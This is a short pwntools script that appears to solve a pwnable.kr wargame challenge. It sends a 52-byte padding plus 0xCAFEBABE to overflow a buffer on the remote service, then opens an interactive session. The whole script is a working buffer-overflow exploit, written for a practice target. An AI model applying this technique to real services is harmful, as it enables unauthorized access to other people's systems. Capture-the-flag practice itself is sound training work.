from pwn import *

r = remote("pwnable.kr", 9000)

payload = b"a"*52 + p32(0xCAFEBABE)
r.sendline(payload)


r.interactive()